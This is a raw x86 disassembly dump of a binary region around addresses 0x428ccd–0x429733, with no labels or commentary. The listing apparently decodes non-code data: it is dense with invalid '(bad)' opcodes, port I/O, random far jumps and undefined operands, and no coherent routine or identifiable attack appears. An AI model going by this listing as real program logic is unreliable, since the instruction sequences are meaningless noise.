  428ccd:	mov    al,0x99
  428ccf:	test   DWORD PTR [ecx+eiz*4-0x74],0x40dbc37e
  428cd7:	sub    dh,BYTE PTR [edi-0x6a]
  428cda:	or     ebx,DWORD PTR [ebx+0x379ae201]
  428ce0:	sbb    BYTE PTR ds:0x38d14363,bh
  428ce6:	fist   DWORD PTR [ebx+0x5b44923f]
  428cec:	xor    esi,DWORD PTR ds:[ecx+0xc64afaa]
  428cf3:	sahf   
  428cf4:	fmul   QWORD PTR [edx]
  428cf6:	out    0x32,eax
  428cf8:	loopne 0x428ce8
  428cfa:	ss and ebp,ecx
  428cfd:	adc    dl,ah
  428cff:	loop   0x428cb9
  428d01:	loope  0x428cbf
  428d03:	(bad)  
  428d04:	jmp    0x428d80
  428d06:	mov    edx,0x53039f44
  428d0b:	addr16 xchg ebp,eax
  428d0d:	test   DWORD PTR [ebx+0x79],ebp
	...
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x3b8d
  428d82:	outs   dx,BYTE PTR ds:[esi]
  428d83:	and    ebx,DWORD PTR [eax-0x4c]
  428d86:	add    DWORD PTR [eax],eax
  428d88:	add    al,0x1
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	sahf   
  428d8d:	ss hlt 
  428d8f:	pop    ss
  428d90:	ret    
  428d91:	push   ebp
  428d92:	xchg   esi,eax
  428d93:	pop    ebx
  428d94:	jmp    0x428d50
  428d96:	dec    edx
  428d97:	jecxz  0x428df4
  428d99:	mov    eax,0x33592ac8
  428d9e:	push   ss
  428d9f:	add    ah,BYTE PTR [ecx-0x5b22bdd2]
  428da5:	dec    esp
  428da6:	add    ebp,ebx
  428da8:	ret    
  428da9:	cmc    
  428daa:	fisubr WORD PTR [eax-0x35]
  428dad:	ins    BYTE PTR es:[edi],dx
  428dae:	mov    ds:0x63e29233,eax
  428db3:	jmp    0x3723:0xbda9f3ce
  428dba:	repz and BYTE PTR [ecx],ch
  428dbd:	cmp    dh,al
  428dbf:	jae    0x428de6
  428dc1:	stos   BYTE PTR es:[edi],al
  428dc2:	and    BYTE PTR [ebx],cl
  428dc4:	aad    0xd7
  428dc6:	or     al,0x97
  428dc8:	cmp    edx,DWORD PTR [esi+0xb]
  428dcb:	paddusb mm6,QWORD PTR [edx+0x3080d3af]
  428dd2:	cmp    BYTE PTR [ebp-0x1f09398b],cl
  428dd8:	icebp  
  428dd9:	add    eax,0x3940fe49
  428dde:	sbb    edx,eax
  428de0:	sbb    DWORD PTR ds:0xdc4b76b2,ecx
  428de6:	gs or  eax,ebx
  428de9:	lods   al,BYTE PTR ds:[esi]
  428dea:	fild   QWORD PTR ds:0xb18ce8ad
  428df0:	je     0x428e62
  428df2:	inc    ebp
  428df3:	arpl   WORD PTR [esi+edi*8],bp
  428df6:	push   esp
  428df7:	jo     0x428e43
  428df9:	outs   dx,DWORD PTR ds:[esi]
  428dfa:	lods   eax,DWORD PTR ds:[esi]
  428dfb:	ror    DWORD PTR [ebx],cl
  428dfd:	xchg   ebp,eax
  428dfe:	sbb    bl,bh
  428e00:	enter  0xcbe2,0x44
  428e04:	aaa    
  428e05:	data16 into 
  428e07:	test   eax,0xce97f0a3
  428e0c:	fsubr  st,st(7)
  428e0e:	add    esp,DWORD PTR [ecx-0x6c]
  428e11:	or     edi,DWORD PTR ds:0xaefa2d87
  428e17:	std    
  428e18:	lahf   
  428e19:	std    
  428e1a:	add    eax,0x30092887
  428e1f:	sub    al,0xb2
  428e21:	fcomi  st,st(0)
  428e23:	xchg   ebx,eax
  428e24:	out    0x56,al
  428e26:	push   ebp
  428e27:	bound  ecx,QWORD PTR [edi+0x7853a444]
  428e2d:	les    ebx,FWORD PTR [ecx+0x1faf6e54]
  428e33:	ja     0x428e04
  428e35:	xchg   ebx,eax
  428e36:	pop    ss
  428e37:	xchg   edi,eax
  428e38:	out    0x4c,eax
  428e3a:	cmp    al,0x32
  428e3c:	(bad)  
  428e3d:	call   0x2a6a:0x540891cc
  428e44:	dec    esp
  428e45:	(bad)  
  428e46:	push   ebx
  428e47:	lds    esi,FWORD PTR [ebx+0x34aa557c]
  428e4d:	bound  edi,QWORD PTR [edx+0x21a5ab76]
  428e53:	test   eax,0x2261e880
  428e58:	adc    DWORD PTR [esi-0x4b],esi
  428e5b:	lods   al,BYTE PTR ds:[esi]
  428e5c:	pop    esi
  428e5d:	arpl   cx,cx
  428e5f:	(bad)  
  428e60:	in     al,dx
  428e61:	scas   al,BYTE PTR es:[edi]
  428e62:	pop    edi
  428e63:	or     eax,0xe7128e6f
  428e68:	inc    ebx
  428e69:	scas   al,BYTE PTR es:[edi]
  428e6a:	(bad)  
  428e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e6c:	inc    ecx
  428e6d:	jle    0x428eb1
  428e6f:	(bad)  
  428e70:	repnz or al,0x76
  428e73:	cld    
  428e74:	cmp    edx,DWORD PTR ds:0x3013368f
  428e7a:	and    BYTE PTR [ebx+0x42],dl
  428e7d:	pop    edi
  428e7e:	call   0xc199:0x8fd16870
  428e85:	es mov esp,0x220355b4
  428e8b:	shl    BYTE PTR [edi+0x21d149],0x0
	...
  428ef2:	add    BYTE PTR [eax],al
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x81
  428f01:	inc    eax
  428f02:	es aas 
  428f04:	pop    esp
  428f05:	mov    ch,0x1
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	sbb    BYTE PTR [edi-0x75],bl
  428f0f:	push   ecx
  428f10:	mov    al,ds:0x970f88c1
  428f15:	data16 loopne 0x428ea3
  428f18:	xchg   esi,esi
  428f1a:	sub    al,0x44
  428f1c:	test   BYTE PTR [edi+0x7a5d269a],ah
  428f22:	xor    ch,BYTE PTR [eax+0x2bc88ce8]
  428f28:	cwde   
  428f29:	repz sbb ecx,DWORD PTR [ebp+0x52c4e1d8]
  428f30:	cmp    ebp,DWORD PTR [ecx]
  428f32:	dec    edi
  428f33:	fld    TBYTE PTR [esi]
  428f35:	xchg   esp,eax
  428f36:	add    DWORD PTR [edx+0x6efe1523],edx
  428f3c:	or     BYTE PTR [esi+0x2e],ch
  428f3f:	fdivr  DWORD PTR [esi+edx*1-0x80]
  428f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f44:	cwde   
  428f45:	cs in  al,dx
  428f47:	or     al,0x50
  428f49:	cs (bad) 
  428f4b:	cmp    al,0x92
  428f4d:	jnp    0x428edf
  428f4f:	sar    DWORD PTR [eax+ebp*2+0x30975f00],cl
  428f56:	pop    eax
  428f57:	repz push ss
  428f59:	inc    ebx
  428f5a:	or     eax,0x97433896
  428f5f:	adc    dh,BYTE PTR [ebp-0x5e]
  428f62:	inc    edi
  428f63:	mov    ds:0xa50cf421,al
  428f68:	dec    eax
  428f69:	out    0x8b,eax
  428f6b:	jmp    0xf437:0x8aa2313b
  428f72:	pop    esi
  428f73:	ret    0xaa0b
  428f76:	pushf  
  428f77:	jb     0x428f9c
  428f79:	cmp    DWORD PTR [esi],edx
  428f7b:	xor    BYTE PTR [eax*8+0x2f7be276],al
  428f82:	scas   eax,DWORD PTR es:[edi]
  428f83:	xor    ch,BYTE PTR [ebx+0x10]
  428f86:	retf   0xcc7e
  428f89:	fsubr  QWORD PTR [esi+eiz*4+0x1a78cf97]
  428f90:	sub    DWORD PTR [edi+0x3e],edx
  428f93:	movntq (bad),mm5
  428f94:	out    0xeb,eax
  428f96:	pushf  
  428f97:	data16 js 0x428f3a
  428f9a:	mov    BYTE PTR [edi+0x1c],bl
  428f9d:	je     0x428f4c
  428f9f:	jp     0x429012
  428fa1:	add    al,0x5b
  428fa3:	fst    DWORD PTR [edi]
  428fa5:	inc    edi
  428fa6:	push   ss
  428fa7:	pop    ss
  428fa8:	(bad)  
  428faa:	xchg   ebp,eax
  428fab:	(bad)  
  428fac:	out    0x35,al
  428fae:	jle    0x428fce
  428fb0:	not    BYTE PTR [edx-0x24]
  428fb3:	inc    ecx
  428fb4:	iret   
  428fb5:	mov    cl,0x30
  428fb7:	loop   0x429016
  428fb9:	or     DWORD PTR [ecx+0x54f86527],esi
  428fbf:	ret    0x4fe4
  428fc2:	dec    edi
  428fc3:	imul   edi,DWORD PTR ds:0x2788835b,0xdc9e812e
  428fcd:	aad    0x9a
  428fcf:	loope  0x429049
  428fd1:	mov    eax,ds:0xc76d7042
  428fd6:	cmp    eax,0x12a8bd6
  428fdb:	sar    BYTE PTR [ebp+0x27],0x7b
  428fdf:	in     al,dx
  428fe0:	fwait
  428fe1:	mov    al,0x8d
  428fe3:	mov    edi,0x49e5c1cb
  428fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fe9:	cmc    
  428fea:	das    
  428feb:	jecxz  0x42904d
  428fed:	aas    
  428fee:	int    0xdc
  428ff0:	and    ch,BYTE PTR [esp+edx*1+0x39]
  428ff4:	push   ebx
  428ff5:	lods   al,BYTE PTR ds:[esi]
  428ff6:	adc    edx,0xed2ecea
  428ffc:	adc    BYTE PTR [eax],al
  428ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fff:	neg    esi
  429001:	shl    BYTE PTR [edx],1
  429003:	aaa    
  429004:	pop    ss
  429005:	jmp    0x20ba075d
  42900a:	push   esi
  42900b:	add    edi,ecx
  42900d:	jns    0x429073
  42900f:	clc    
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x69fc7b77
  429081:	js     0x429035
  429083:	fs pusha 
  429085:	mov    dh,0x1
  429087:	add    BYTE PTR [ecx+eax*1],al
  42908a:	add    BYTE PTR [eax],al
  42908c:	mov    BYTE PTR [ebp-0x7b],cl
  42908f:	aaa    
  429090:	mov    dh,0x36
  429092:	jg     0x42903c
  429094:	stos   BYTE PTR es:[edi],al
  429095:	jae    0x42901b
  429097:	out    dx,al
  429098:	mov    cl,0xf3
  42909a:	(bad)  
  42909b:	dec    eax
  42909c:	shl    DWORD PTR [ebp+0x1c],cl
  42909f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290a0:	les    esp,FWORD PTR fs:[edi]
  4290a3:	es (bad) 
  4290a5:	jg     0x4290d1
  4290a7:	std    
  4290a8:	sub    eax,0x8d3c2ec0
  4290ad:	int3   
  4290ae:	cwde   
  4290af:	and    eax,0x5edd52b5
  4290b4:	sbb    al,0x85
  4290b6:	clc    
  4290b7:	int    0x13
  4290b9:	xor    al,0xd8
  4290bb:	sub    DWORD PTR [ebx+0x1e],ebp
  4290be:	arpl   WORD PTR [eax-0x771fcf60],ax
  4290c4:	xchg   esp,eax
  4290c5:	fcmovnu st,st(7)
  4290c7:	mov    edx,0x4e650ed9
  4290cc:	jge    0x429139
  4290ce:	add    DWORD PTR [ecx-0x70045a4a],edx
  4290d4:	push   esi
  4290d5:	push   edi
  4290d6:	es into 
  4290d8:	cmp    DWORD PTR [esi],0xffffff80
  4290db:	in     eax,dx
  4290dc:	icebp  
  4290dd:	retf   
  4290de:	push   esi
  4290df:	sub    edi,DWORD PTR [edx+edi*4-0x11]
  4290e3:	xchg   esi,eax
  4290e4:	sub    al,dl
  4290e6:	mov    edx,0xd4153dc2
  4290eb:	arpl   WORD PTR [ebp+0x4],ax
  4290ee:	lds    ebx,FWORD PTR [esi+0x5]
  4290f1:	bound  eax,QWORD PTR [edx-0x3f]
  4290f4:	mov    ds:0xa111bdcf,al
  4290f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290fa:	dec    edx
  4290fb:	adc    ch,dh
  4290fd:	mov    ebp,0xfbb84066
  429102:	or     BYTE PTR [esi+0x4f0f796],bh
  429108:	(bad)  
  429109:	shl    DWORD PTR [ebx+0x2ee3e294],1
  42910f:	lods   eax,DWORD PTR ds:[esi]
  429110:	div    DWORD PTR [ecx]
  429112:	and    eax,0x7f460110
  429117:	pop    ecx
  429118:	hlt    
  429119:	cmp    al,0xf8
  42911b:	stos   DWORD PTR es:[edi],eax
  42911c:	mov    al,0xf3
  42911e:	sti    
  42911f:	lea    edx,[edi-0x41a18b31]
  429125:	cmp    dh,BYTE PTR fs:[esp+ebx*4+0x4b]
  42912a:	xchg   edx,eax
  42912b:	out    0x80,eax
  42912d:	(bad)  
  42912e:	dec    ebx
  42912f:	mov    bh,0xd7
  429131:	add    eax,esp
  429133:	mov    esi,0x4217287f
  429138:	and    BYTE PTR [eax-0x57],dl
  42913b:	push   ds
  42913c:	jmp    0xe986:0xadad11a1
  429143:	ror    DWORD PTR [edx+0x33],0x1f
  429147:	push   ss
  429148:	xchg   al,bh
  42914a:	xchg   ebx,edi
  42914c:	or     esp,ecx
  42914e:	call   0x530d:0x64e85836
  429155:	mov    eax,0xd60c21da
  42915a:	push   ecx
  42915b:	dec    edx
  42915c:	sub    BYTE PTR [esi+0x61e106b5],0x99
  429163:	and    edx,DWORD PTR [esi-0x75]
  429166:	inc    edi
  429167:	jp     0x42916b
  429169:	pop    ecx
  42916a:	mov    eax,0xd1a7534a
  42916f:	ins    DWORD PTR es:[edi],dx
  429170:	dec    edx
  429171:	faddp  st(6),st
  429173:	in     al,dx
  429174:	stos   DWORD PTR es:[edi],eax
  429175:	imul   eax,DWORD PTR ss:[esi+ecx*2-0x6dacf703],0x11
  42917e:	jmp    0xf6f2:0xd59322d
  429185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429186:	mov    ch,0xf8
  429188:	pop    edi
  429189:	mov    dl,0xed
  42918b:	push   es
  42918c:	in     eax,0x54
  42918e:	add    cl,BYTE PTR [eax+0x0]
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebx+ebp*2+0x64005cd7],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    ah,ah
  42920d:	mov    bh,0x9c
  42920f:	mov    ah,0x52
  429211:	jmp    0x42925d
  429213:	and    bl,ah
  429215:	js     0x4291fe
  429217:	jmp    0x4b668a84
  42921c:	push   eax
  42921d:	stos   BYTE PTR es:[edi],al
  42921e:	xchg   edi,eax
  42921f:	mov    ebp,0x336d79bc
  429224:	pusha  
  429225:	js     0x4291fe
  429227:	cdq    
  429228:	pop    eax
  429229:	mov    esp,0xad3ce4de
  42922e:	xchg   edx,eax
  42922f:	add    eax,0xb495e0ee
  429234:	pop    ebp
  429235:	popf   
  429236:	scas   eax,DWORD PTR es:[edi]
  429237:	jl     0x4292a8
  429239:	adc    BYTE PTR [edx+0x3],ch
  42923c:	mov    DWORD PTR ds:0xda6a74c0,edx
  429242:	mov    bh,0x3c
  429244:	and    edi,DWORD PTR [eax+0x3ca969d2]
  42924a:	sub    BYTE PTR [ebp+0x5c],bh
  42924d:	add    DWORD PTR [eax+0x13f8a42],edx
  429253:	add    DWORD PTR [ecx+0x15],0x3f
  429257:	imul   esi,DWORD PTR [ecx-0x75],0x8259e2c6
  42925e:	xlat   BYTE PTR ds:[ebx]
  42925f:	push   ecx
  429260:	hlt    
  429261:	sbb    BYTE PTR ss:[ebp-0x6f],ch
  429265:	cld    
  429266:	push   es
  429267:	xchg   BYTE PTR [esi+0x47ff320a],cl
  42926d:	inc    edx
  42926e:	pop    edx
  42926f:	out    0x6,al
  429271:	adc    BYTE PTR [esp+edx*4],cl
  429274:	mov    eax,ds:0x4b587ae
  429279:	loopne 0x429273
  42927b:	pop    eax
  42927c:	xor    edx,DWORD PTR [ebx]
  42927e:	and    ecx,DWORD PTR ds:0x32f7c552
  429284:	outs   dx,DWORD PTR ds:[esi]
  429285:	lahf   
  429286:	in     al,dx
  429287:	jns    0x429250
  429289:	pop    edx
  42928a:	jecxz  0x429257
  42928c:	loopne 0x4292ab
  42928e:	ret    0x2a91
  429291:	push   ds
  429292:	arpl   WORD PTR [edx-0x687a1604],sp
  429298:	repnz stos BYTE PTR es:[edi],al
  42929a:	imul   eax,eax,0x35
  42929d:	sti    
  42929e:	divps  xmm4,xmm7
  4292a1:	pop    edi
  4292a2:	neg    BYTE PTR [ebp-0x80ebb43]
  4292a8:	pop    ebp
  4292a9:	leave  
  4292aa:	out    0x46,al
  4292ac:	ins    BYTE PTR es:[edi],dx
  4292ad:	in     al,0xd7
  4292af:	lock aam 0x4f
  4292b2:	mov    ch,0x41
  4292b4:	mov    edi,0x3477fd19
  4292b9:	sbb    eax,0x5e1ada98
  4292be:	xor    al,0xfb
  4292c0:	frstor [ebx]
  4292c2:	push   edx
  4292c3:	xlat   BYTE PTR ds:[ebx]
  4292c4:	std    
  4292c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292c6:	or     BYTE PTR [esi-0x67735b0f],0xcc
  4292cd:	stc    
  4292ce:	inc    esp
  4292cf:	out    dx,eax
  4292d0:	jmp    0x42926b
  4292d2:	int    0xe2
  4292d4:	pushf  
  4292d5:	xchg   edi,eax
  4292d6:	dec    edi
  4292d7:	cli    
  4292d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292d9:	inc    ebp
  4292da:	dec    edx
  4292db:	addr16 jmp 0x36df:0xc3ce53be
  4292e3:	add    al,0x2b
  4292e5:	inc    esp
  4292e6:	mov    ah,0xcc
  4292e8:	int3   
  4292e9:	xor    eax,edx
  4292eb:	int    0x6d
  4292ed:	push   ebp
  4292ee:	cmp    BYTE PTR [ecx-0x667af021],ah
  4292f4:	inc    ebx
  4292f5:	aam    0xcc
  4292f7:	mov    ds:0x369f0f10,eax
  4292fc:	push   ebp
  4292fd:	hlt    
  4292fe:	inc    edx
  4292ff:	jmp    0x429350
  429301:	test   al,0xbe
  429303:	jnp    0x4292ff
  429305:	repz aam 0xd7
  429308:	fidiv  DWORD PTR [edx]
  42930a:	repnz int3 
  42930c:	aaa    
  42930d:	push   cs
  42930e:	pop    edi
  42930f:	sldt   WORD PTR [eax]
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xef
  429381:	fs ss push esi
  429384:	push   0x40001b8
  429389:	add    DWORD PTR [eax],eax
  42938b:	add    BYTE PTR [ecx-0x79],bl
  42938e:	fdivr  QWORD PTR [esi-0x16]
  429391:	ja     0x4293f6
  429393:	mov    eax,eax
  429395:	jge    0x429326
  429397:	std    
  429398:	loop   0x4293ca
  42939a:	push   ds
  42939b:	push   ss
  42939c:	or     DWORD PTR [edi],edx
  42939e:	inc    esp
  42939f:	jb     0x429376
  4293a1:	xchg   ebp,eax
  4293a2:	xor    BYTE PTR [ecx+0x5e],cl
  4293a5:	dec    esi
  4293a6:	cmp    BYTE PTR [ebx+0x12],bh
  4293a9:	pop    es
  4293aa:	ins    DWORD PTR es:[edi],dx
  4293ab:	jp     0x429367
  4293ad:	pop    ss
  4293ae:	jecxz  0x429410
  4293b0:	cli    
  4293b1:	adc    edx,DWORD PTR [esi-0xd0786b4]
  4293b7:	imul   esp,DWORD PTR [esi-0x68],0xffffffa8
  4293bb:	fs push es
  4293bd:	mov    dl,0x63
  4293bf:	sub    ecx,esi
  4293c1:	sbb    al,0x7
  4293c3:	mov    ah,0x18
  4293c5:	ss (bad) 
  4293c8:	das    
  4293c9:	stc    
  4293ca:	push   es
  4293cb:	enter  0x80e9,0x67
  4293cf:	mov    WORD PTR [edx],gs
  4293d1:	jmp    0x4509:0x407d88ea
  4293d8:	adc    BYTE PTR [esi],0x8a
  4293db:	mov    ecx,0xee9e7204
  4293e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293e1:	out    dx,eax
  4293e2:	lods   eax,DWORD PTR ds:[esi]
  4293e3:	sub    bh,BYTE PTR [ebp-0x2d]
  4293e6:	push   ebp
  4293e7:	rol    BYTE PTR [ecx-0x19e6ba16],0xc3
  4293ee:	sub    dh,BYTE PTR [esi-0x51]
  4293f1:	(bad)  
  4293f2:	mov    esp,0xf6dd2964
  4293f7:	pop    edx
  4293f8:	adc    DWORD PTR ds:[edx+0x3be54a1b],edi
  4293ff:	iret   
  429400:	daa    
  429401:	sbb    edx,DWORD PTR [esi]
  429403:	sbb    cl,cl
  429405:	test   eax,0x367cf765
  42940a:	jno    0x42945e
  42940c:	cmp    BYTE PTR [ebx],bl
  42940e:	(bad)  
  42940f:	fldcw  WORD PTR [eax]
  429411:	add    eax,0x28be85d7
  429416:	mov    dh,dh
  429418:	add    esp,DWORD PTR [edi+0x18]
  42941b:	xchg   eax,ebx
  42941d:	adc    al,bh
  42941f:	sbb    ch,dh
  429421:	(bad)  
  429422:	mov    edx,0xe705887e
  429427:	lods   al,BYTE PTR ds:[esi]
  429428:	and    eax,DWORD PTR [eax+0x11]
  42942b:	pop    edi
  42942c:	mov    ebp,0x33f26eb
  429431:	(bad)  fs:[edx]
  429434:	and    al,0x97
  429436:	hlt    
  429437:	in     al,0xe3
  429439:	xchg   BYTE PTR [ebp+0x17380742],dl
  42943f:	xchg   edx,eax
  429440:	mov    bh,0x9a
  429442:	and    DWORD PTR [ecx],0x2283441d
  429448:	sbb    esi,DWORD PTR [edx-0x6f28ae14]
  42944e:	ret    
  42944f:	add    ebp,DWORD PTR [ebp+0x3]
  429452:	mov    esi,0xacfee89c
  429457:	mov    ebp,0x8ec0b291
  42945c:	jb     0x429474
  42945e:	shl    ah,1
  429460:	aas    
  429461:	xchg   esi,eax
  429462:	int3   
  429463:	jne    0x429408
  429465:	out    dx,al
  429466:	shr    DWORD PTR [esi-0x557f3345],0xea
  42946d:	call   0x2930:0x48cd8f1c
  429474:	mov    bl,0x41
  429476:	out    0xa8,al
  429478:	in     eax,0xe1
  42947a:	and    dl,BYTE PTR [esp+ebp*2-0x40]
  42947e:	ss mov dl,0xda
  429481:	cld    
  429482:	add    DWORD PTR [eax],ebx
  429484:	sub    esi,esi
  429486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429487:	retf   
  429488:	or     DWORD PTR [edi-0x7bafef8f],esi
  42948e:	mov    BYTE PTR [ebx+0x0],dh
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0xef00dea],dx
  429503:	(bad)  
  429504:	ins    BYTE PTR es:[edi],dx
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	jnp    0x4294a1
  42950e:	je     0x42950c
  429510:	js     0x429506
  429512:	adc    al,0x79
  429514:	dec    esp
  429515:	push   es
  429516:	and    ebx,DWORD PTR [ebx+0x36]
  429519:	adc    cl,BYTE PTR [edx+ebx*8]
  42951c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42951d:	fistp  WORD PTR [ebx]
  42951f:	mov    eax,0x570ac52b
  429524:	xor    bh,BYTE PTR [eax+0x8]
  429527:	push   esp
  429528:	push   ss
  429529:	jnp    0x42954c
  42952b:	addr16 std 
  42952d:	mov    ds:0x365ab6a5,al
  429532:	jbe    0x429588
  429534:	and    al,0x60
  429536:	and    eax,0xae06406f
  42953b:	mov    bh,0x2f
  42953d:	jle    0x429503
  42953f:	dec    edx
  429540:	and    DWORD PTR [ebx],0x2e
  429543:	(bad)  
  429545:	sub    ah,BYTE PTR [ebx+0x59]
  429548:	(bad)  
  42954a:	sub    eax,0xd923e511
  42954f:	mov    ah,0x1f
  429551:	sub    eax,0x6cc0838a
  429556:	push   cs
  429557:	lods   eax,DWORD PTR ds:[esi]
  429558:	add    al,0x0
  42955a:	jge    0x429574
  42955c:	inc    edx
  42955d:	jle    0x429525
  42955f:	inc    esp
  429560:	push   ss
  429561:	jne    0x4295ae
  429563:	dec    ebp
  429564:	or     eax,edi
  429566:	ss jp  0x429585
  429569:	adc    ecx,esp
  42956b:	ins    DWORD PTR es:[edi],dx
  42956c:	mul    esi
  42956e:	adc    DWORD PTR [ecx],edx
  429570:	jns    0x429521
  429572:	jno    0x429574
  429574:	cmc    
  429575:	push   0x6a
  429577:	call   0xaea7:0x7bf2bbc7
  42957e:	mov    ?,WORD PTR [ebx-0x296d16df]
  429584:	loope  0x42952f
  429586:	jo     0x429558
  429588:	test   BYTE PTR [edx-0x77b69ed3],dl
  42958e:	add    bh,bl
  429590:	adc    al,0x4c
  429592:	mov    edi,0x67d3dc73
  429597:	sahf   
  429598:	push   DWORD PTR [edx-0x55]
  42959b:	mov    bl,BYTE PTR [edi+0x3f2d3248]
  4295a1:	pushf  
  4295a2:	dec    BYTE PTR [ecx]
  4295a4:	stos   DWORD PTR es:[edi],eax
  4295a5:	lods   eax,DWORD PTR ds:[esi]
  4295a6:	jmp    0xe958:0x3aec5f9e
  4295ad:	cdq    
  4295ae:	xchg   ebx,eax
  4295af:	into   
  4295b0:	(bad)  
  4295b3:	jge    0x429570
  4295b5:	push   edx
  4295b6:	iret   
  4295b7:	lods   al,BYTE PTR ds:[esi]
  4295b8:	dec    ecx
  4295b9:	mov    dl,0xf0
  4295bb:	push   0x1a
  4295bd:	fsubr  QWORD PTR [eax-0x40e52dd6]
  4295c3:	xor    BYTE PTR [ebx-0x4bcd8606],dh
  4295c9:	popf   
  4295ca:	xchg   edi,eax
  4295cb:	dec    esp
  4295cc:	push   esp
  4295cd:	jge    0xdb91a1e3
  4295d3:	iret   
  4295d4:	sbb    DWORD PTR [edx-0x46],edx
  4295d7:	icebp  
  4295d8:	xchg   esi,ecx
  4295da:	jae    0x42956c
  4295dc:	and    eax,0x2ede242d
  4295e1:	aad    0x92
  4295e3:	mov    sp,0x4cad
  4295e7:	test   BYTE PTR [esp+esi*4],0x64
  4295eb:	and    eax,0x3208015
  4295f0:	in     eax,dx
  4295f1:	(bad)  [ebp+0x13]
  4295f4:	push   ebp
  4295f5:	fadd   QWORD PTR [esi-0x6e2eb367]
  4295fb:	and    DWORD PTR [ecx+esi*2+0x12],0xfffffff3
  429600:	inc    eax
  429601:	or     ebp,ecx
  429603:	pop    eax
  429604:	jno    0x429662
  429606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429607:	(bad)  
  429608:	jmp    0x20a6:0xcb44679a
  42960f:	inc    DWORD PTR [eax]
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	les    edi,FWORD PTR [eax]
  429682:	test   DWORD PTR [eax+0x1ba70],esp
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	jecxz  0x42966f
  42968e:	and    bl,BYTE PTR [eax+0x1f0ecf54]
  429694:	jge    0x429624
  429696:	aas    
  429697:	mov    DWORD PTR [ebx+0x298f40b0],esp
  42969d:	sti    
  42969e:	push   edx
  42969f:	sub    al,dl
  4296a1:	stc    
  4296a2:	mov    esp,0x66fea53
  4296a7:	data16 ds jnp 0x42969e
  4296ab:	dec    esi
  4296ac:	sbb    al,0xa0
  4296ae:	sbb    eax,0xe519754b
  4296b3:	mov    dh,0x36
  4296b5:	std    
  4296b6:	xor    eax,0x8855da8e
  4296bb:	fisttp WORD PTR [esp+ebx*8]
  4296be:	pop    esp
  4296bf:	xor    al,0xdb
  4296c1:	sbb    eax,0x81714a95
  4296c6:	jo     0x42972c
  4296c8:	sbb    DWORD PTR [ecx],esi
  4296ca:	outs   dx,DWORD PTR ds:[esi]
  4296cb:	cmp    bh,BYTE PTR [esi+0x4a78d965]
  4296d1:	push   cs
  4296d2:	push   ebp
  4296d3:	xchg   BYTE PTR [edx-0x1d2efcc3],bh
  4296d9:	mov    ah,0x95
  4296db:	pusha  
  4296dc:	jp     0x429713
  4296de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296df:	add    BYTE PTR [esi],ch
  4296e1:	fnstsw WORD PTR [edi+0x4e5c8806]
  4296e7:	retf   
  4296e8:	xchg   ecx,eax
  4296e9:	pop    ds
  4296ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296eb:	mov    ebx,0x2fdbdacb
  4296f0:	lea    eax,[ecx]
  4296f2:	mov    dl,ah
  4296f4:	outs   dx,BYTE PTR ds:[esi]
  4296f5:	adc    ebp,ebx
  4296f7:	xor    eax,0x14c31aae
  4296fc:	int3   
  4296fd:	xor    esp,DWORD PTR [ebx+esi*4-0x38]
  429701:	iret   
  429702:	(bad)  
  429704:	mov    ds:0x27449f66,al
  429709:	push   0xdcb4cd73
  42970e:	add    esi,ecx
  429710:	rcl    DWORD PTR [esp+ebp*1],0x6a
  429714:	loope  0x4296e9
  429716:	es call 0x6e3b:0xc31302ae
  42971e:	fdivr  st,st(5)
  429720:	test   eax,0x1f8654e6
  429725:	int    0xe6
  429727:	sbb    al,0xeb
  429729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42972a:	push   edx
  42972b:	cli    
  42972c:	xor    edx,DWORD PTR [ebp+0x23c74564]
  429732:	push   cs
  429733:	pop    edx
